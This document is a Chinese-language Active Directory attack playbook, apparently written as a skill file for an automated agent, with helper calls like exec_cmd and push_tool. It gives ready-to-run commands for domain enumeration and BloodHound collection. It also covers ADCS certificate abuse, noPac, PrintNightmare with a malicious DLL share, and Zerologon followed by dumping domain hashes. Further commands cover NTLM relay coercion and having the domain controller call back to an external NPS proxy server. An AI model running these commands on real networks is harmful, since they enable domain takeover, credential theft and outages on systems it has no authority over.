# 域渗透攻击参考

## 1. 域信息收集

### 1.1 基础域信息

```python
# 域基础信息收集
domain_cmds = [
    "nltest /dclist:",                         # 域控列表
    "net group /domain",                       # 域组列表
    'net group "Domain Admins" /domain',       # 域管列表
    'net group "Domain Controllers" /domain',  # 域控列表
    'net group "Enterprise Admins" /domain',   # 企业管理员
    "net user /domain",                        # 域用户列表
    "gpresult /r",                             # 组策略结果
    "nltest /domain_trusts",                   # 域信任关系
    "dsquery server -forest",                  # 林内所有DC
    'dsquery user -limit 0 | dsget user -samid -fn -ln -display', # 用户详情
]
for cmd in domain_cmds:
    print(f"\n[*] {cmd}")
    print(exec_cmd(cid, cmd))
```

关键信息提取：
- 域名（FQDN + NetBIOS）
- 域控 IP 和主机名
- 域管理员列表
- 域信任关系
- 域功能级别

### 1.2 SharpHound / BloodHound 收集

```python
# 推送 SharpHound 收集器
push_tool(cid, "SharpHound/SharpHound.exe", "C:\\temp")

# 执行收集（全量，包含 Session）
exec_cmd(cid, "C:\\temp\\SharpHound.exe --collectionmethods All --outputdirectory C:\\temp")
# 等待收集完成
time.sleep(30)

# 查找并下载结果
result = exec_cmd(cid, 'dir /b C:\\temp\\*_BloodHound.zip')
zip_name = result.strip()
download_file(cid, f"C:\\temp\\{zip_name}", f"./{zip_name}")
# 本地导入 BloodHound 分析：
# - Shortest Paths to Domain Admins
# - Kerberoastable Users
# - AS-REP Roastable Users
# - Users with DCSync Rights
# - Unconstrained Delegation Computers
# - ADCS ESC 模板
```

### 1.3 LDAP 枚举

```python
# SPN 枚举（Kerberoasting 预查）
exec_cmd(cid, 'setspn -T {domain} -Q */*')

# ADCS 证书模板枚举
push_tool(cid, "Certify/Certify.exe", "C:\\temp")
exec_cmd(cid, "C:\\temp\\Certify.exe find /vulnerable")

# 委派配置枚举
exec_cmd(cid, 'Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation 2>nul')  # PowerShell
```

### 1.4 域内 DNS 信息

```python
# 通过 DNS 查询域内关键记录
dns_queries = [
    f"nslookup -type=SRV _ldap._tcp.dc._msdcs.{domain}",  # 域控
    f"nslookup -type=SRV _kerberos._tcp.{domain}",          # KDC
    f"nslookup -type=SRV _gc._tcp.{domain}",                # 全局编录
    f"nslookup -type=any {domain}",                          # 域记录
]
```

---

## 2. 域用户攻击

### 2.4 基于已有凭证直接登录域控服务器

---

## 3. 域权限提升

**核心原则：先检测再利用，不盲目攻击。** 每个漏洞都有对应的检测手段，必须先确认目标存在该漏洞且可利用，再执行 exploit：
- ADCS → `certipy-ad find -u {user}@{domain} -p {password} -dc-ip {dc_ip} -vulnerable -stdout` 检测
- noPac → `/opt/noPac/scanner.py` 检测
- Zerologon → 无需检测（最后手段，直接 exploit 但必须立即恢复）

### 3.1 ADCS 攻击（Active Directory Certificate Services）

ADCS 是近年最有效的域提权路径之一。使用 certipy-ad（pip install certipy-ad）通过 SOCKS5 代理完成检测和利用。

```python
# ============================================================
# 请使用 nps-operator skill 创建 SOCKS5 代理
#
# --- Step 1: 检测可利用的证书模板 ---
#   proxychains -f /tmp/proxychains_dc.conf certipy-ad find \
#     -u {user}@{domain} -p {password} -dc-ip {dc_ip} -vulnerable -stdout
#
#   检测结果会列出所有可利用的 ESC 类型（ESC1~ESC8），根据输出选择利用方式
#
# --- Step 2: 利用（按检测到的 ESC 类型选择）---
#
# ** ESC1（最常见）**：模板允许请求者指定 SAN，可冒充任意用户
#   proxychains -f /tmp/proxychains_dc.conf certipy-ad req \
#     -u {user}@{domain} -p {password} \
#     -ca {ca_name} -template {vulnerable_template} \
#     -upn administrator@{domain} -dc-ip {dc_ip}
#
# ** ESC4 **：低权限用户可修改模板 → 改为 ESC1 条件 → 利用 → 恢复
#   # 修改模板为可利用状态
#   proxychains -f /tmp/proxychains_dc.conf certipy-ad template \
#     -u {user}@{domain} -p {password} \
#     -template {template_name} -save-old -dc-ip {dc_ip}
#   # 按 ESC1 方式利用（同上 req 命令）
#   # 利用完成后恢复模板
#   proxychains -f /tmp/proxychains_dc.conf certipy-ad template \
#     -u {user}@{domain} -p {password} \
#     -template {template_name} -configuration {old_config_file} -dc-ip {dc_ip}
#
# ** ESC8 **：NTLM Relay to ADCS HTTP 端点
#   proxychains -f /tmp/proxychains_dc.conf ntlmrelayx.py \
#     -t http://{ca_ip}/certsrv/certfnsh.asp \
#     -smb2support --adcs --template DomainController
#   # 配合 PetitPotam 触发域控认证：
#   proxychains -f /tmp/proxychains_dc.conf python3 PetitPotam.py \
#     -u {user} -p {password} {listener_ip} {dc_ip}
#
# --- Step 3: 使用获取的证书认证获取域管 hash ---
#   proxychains -f /tmp/proxychains_dc.conf certipy-ad auth \
#     -pfx administrator.pfx -dc-ip {dc_ip}
#   # 输出 administrator 的 NTLM hash，可用于 PTH 登录
# ============================================================
```

**备选：Windows 内网 Certify.exe + Rubeus.exe**（通过 NPS 在目标机执行）：

```python
# 检测
push_tool(cid, "Certify/Certify.exe", "C:\\temp")
result = exec_cmd(cid, "C:\\temp\\Certify.exe find /vulnerable")
print(result)

# ESC1 利用
exec_cmd(cid, f'C:\\temp\\Certify.exe request /ca:{ca_name} /template:{template_name} /altname:Administrator')
# 使用 Rubeus 通过证书获取 TGT
push_tool(cid, "Rubeus/Rubeus.exe", "C:\\temp")
exec_cmd(cid, f'C:\\temp\\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /ptt')
```

### 3.2 noPac (CVE-2021-42287 / CVE-2021-42278)

SAM Name 欺骗，任意域用户 → 域管 TGT。效果好、操作简单、成功率高。

**方式1：Windows exe 版（通过 NPS 执行）**

```python
# noPac 利用
push_tool(cid, "noPac/noPac.exe", "C:\\temp")
# 扫描是否可利用
exec_cmd(cid, f'C:\\temp\\noPac.exe scan -domain {domain} -user {user} -pass {password}')
# 利用获取域管权限（获取 shell 或 DCSync）
exec_cmd(cid, f'C:\\temp\\noPac.exe -domain {domain} -user {user} -pass {password} /dc {dc_hostname} /mAccount controlledComputer /mPassword Password123 /service cifs /ptt')
```

**方式2：Python/impacket 版（通过 SOCKS5 代理使用，推荐）**

```python
# ============================================================
# noPac Python 版，通过 SOCKS5 代理使用
# 请使用 nps-operator skill 创建 SOCKS5 代理
#
# 通用格式：
#   proxychains -f /tmp/proxychains_dc.conf python /opt/noPac/noPac.py 域名/域用户:'域用户密码' \
#     -dc-ip 域控IP -dc-host 域控主机名 --impersonate administrator [操作选项] [-use-ldap]
#
# --- 漏洞检测 ---
#   proxychains -f /tmp/proxychains_dc.conf python /opt/noPac/scanner.py {domain}/{user}:'{password}' -dc-ip {dc_ip}
#
# --- GetST（获取服务票据）---
#   proxychains -f /tmp/proxychains_dc.conf python /opt/noPac/noPac.py {domain}/{user}:'{password}' -dc-ip {dc_ip}
#
# --- Auto Shell（获取域管交互式 shell）---
#   proxychains -f /tmp/proxychains_dc.conf python /opt/noPac/noPac.py {domain}/{user}:'{password}' \
#     -dc-ip {dc_ip} -dc-host {dc_hostname} --impersonate administrator -shell
#
# --- Dump Hash（导出域内所有 hash）---
#   proxychains -f /tmp/proxychains_dc.conf python /opt/noPac/noPac.py {domain}/{user}:'{password}' \
#     -dc-ip {dc_ip} -dc-host {dc_hostname} --impersonate administrator -dump -use-ldap
#
# --- Dump 指定用户 hash ---
#   proxychains -f /tmp/proxychains_dc.conf python /opt/noPac/noPac.py {domain}/{user}:'{password}' \
#     -dc-ip {dc_ip} -dc-host {dc_hostname} --impersonate administrator -dump \
#     -just-dc-user {domain}/krbtgt
#
# 注意：默认使用 LDAPS，如遇 SSL 错误请添加 -use-ldap
#
# 认证方式支持：
#   密码: domain/user:'password'
#   Hash: -hashes LMHASH:NTHASH
#   Kerberos: -k -aesKey <hex_key>
# ============================================================
```

**MAQ=0 绕过**（Machine Account Quota 为 0 时无法添加新机器账户）：

```python
# ============================================================
# MAQ=0 Method 1：利用对已有计算机的写权限
#
# Step 1: 查找当前用户可修改的计算机账户
#   AdFind.exe -sc getacls -sddlfilter ;;"[WRT PROP]";;computer;{domain}\{user} -recmute
#
# Step 2: 使用 -no-add + -target-name 指定已有计算机
#   proxychains -f /tmp/proxychains_dc.conf python /opt/noPac/noPac.py {domain}/{user}:'{password}' \
#     -dc-ip {dc_ip} -dc-host {dc_hostname} --impersonate administrator \
#     -no-add -target-name {computer_name}$ -old-hash :{computer_ntlm_hash} -shell
#
# ⚠️ 警告：不要通过 LDAPS 或 SAMR 修改域内计算机密码，可能破坏计算机与域的信任关系！
#
# ---
# MAQ=0 Method 2：利用 CreateChild 权限的账户
#
# Step 1: 查找有 CreateChild 权限的账户
#   AdFind.exe -sc getacls -sddlfilter ;;"[CR CHILD]";;computer; -recmute
#
# Step 2: 使用该账户 + -create-child 标志
#   proxychains -f /tmp/proxychains_dc.conf python /opt/noPac/noPac.py {domain}/{createchild_user}:'{password}' \
#     -dc-ip {dc_ip} -dc-host {dc_hostname} --impersonate administrator -create-child
# ============================================================
```

前提条件：拥有任意域用户的密码或 hash。

### 3.3 PrintNightmare (CVE-2021-34527)

```python
# 通过 SOCKS5 + impacket
# ============================================================
# 请使用 nps-operator skill 创建 SOCKS5 代理
# proxychains -f /tmp/proxychains_dc.conf python3 CVE-2021-34527.py {domain}/{user}:{password}@{dc_ip} '\\<smb_share>\evil.dll'
# ============================================================
```

### 3.4 Zerologon (CVE-2020-1472)

**最后手段**。不需要任何凭据，但会将域控机器密码置空，可能导致域服务异常。

```python
# ============================================================
# Zerologon 攻击（慎用！会破坏域控信任关系！）
# 请使用 nps-operator skill 创建 SOCKS5 代理
# 然后本地按以下步骤执行：
#
# --- Step 1: 置空 DC$ 密码 ---
#   proxychains -f /tmp/proxychains_dc.conf python3 /opt/zerologon/cve-2020-1472-exploit.py {dc_netbios_name} {dc_ip}
#   # 成功后 DC$ 机器账户密码被置为空
#   # 空密码对应 NTLM hash: 31d6cfe0d16ae931b73c59d7e0c089c0
#
# --- Step 2: 使用空 hash dump 域管凭据 ---
#   # 方式A：dump 所有域 hash
#   proxychains -f /tmp/proxychains_dc.conf impacket-secretsdump {domain}/{dc_netbios_name}\$@{dc_ip} \
#     -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 \
#     -just-dc
#
#   # 方式B：仅提取 administrator hash（更快更精准）
#   proxychains -f /tmp/proxychains_dc.conf impacket-secretsdump {domain}/{dc_netbios_name}\$@{dc_ip} \
#     -dc-ip {dc_ip} \
#     -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 \
#     -just-dc-user "administrator"
#
# --- Step 3: 使用域管 hash 获取 shell ---
#   proxychains -f /tmp/proxychains_dc.conf impacket-wmiexec \
#     -hashes aad3b435b51404eeaad3b435b51404ee:{admin_ntlm_hash} \
#     administrator@{dc_ip}
#
# --- Step 4: 恢复 DC 密码（必须立即执行！）---
#   # 方法A：从注册表提取原始机器密码（需域管权限）
#   #   修改 impacket secretsdump.py 第1530行条件为 if True:
#   #   重新运行 secretsdump（使用域管账户），会输出 hex 编码的明文机器密码
#
#   # 方法B：离线提取（更安全）
#   #   先导出注册表 hive：
#   #     reg save HKLM\SYSTEM system.hive
#   #     reg save HKLM\SECURITY security.hive
#   #   然后本地离线运行 secretsdump（离线模式会自动输出明文密钥）
#
#   # 获取到 hex 密码后恢复：
#   proxychains -f /tmp/proxychains_dc.conf python3 /opt/zerologon/restorepassword.py \
#     {domain}/{dc_netbios_name}@{dc_netbios_name} \
#     -target-ip {dc_ip} \
#     -hexpass {original_hex_password}
#
# ⚠️ 警告：
#   - 不恢复密码会导致域复制失败和所有域服务异常
#   - 多域控环境下会破坏 DC 间通信，操作前评估影响
#   - 恢复密码时 restorepassword.py 先用空密码认证再设回原密码
# ============================================================
```

### 3.5 NTLM Relay

```python
# Responder + PetitPotam / PrinterBug
# ============================================================
# 需要 SOCKS5 代理（nps-operator skill）
# 
# 方式1：PetitPotam (MS-EFSRPC)
#   proxychains -f /tmp/proxychains_dc.conf python3 PetitPotam.py -u {user} -p {password} {listener_ip} {dc_ip}
#
# 方式2：PrinterBug (MS-RPRN)
#   proxychains -f /tmp/proxychains_dc.conf python3 printerbug.py {domain}/{user}:{password}@{dc_ip} {listener_ip}
#
# 配合 ntlmrelayx 到 LDAP/ADCS 完成攻击
# ============================================================
```

---

## 4. 域控攻击

### 4.1 域控 NPS 上线

域控通常有出站限制，可能需要通过已有代理链上线：

```python
# 方式1：域控直接外连（如果允许）
exec_cmd(dc_cid, 'C:\\temp\\npc_windows_amd64.exe -server=<NPS_IP>:8024 -vkey=auto')

# 方式2：通过内网机器级联
# 如果域控不能直接出网，先在能出网的域内主机上搭建级联
# ============================================================
# 请使用 nps-operator skill 在中间主机上搭建级联代理
# DC 通过中间主机的 44944 端口连接 NPS
# exec_cmd(dc_cid, 'C:\\temp\\npc.exe -server=<中间主机IP>:44944 -vkey=auto')
# ============================================================
```
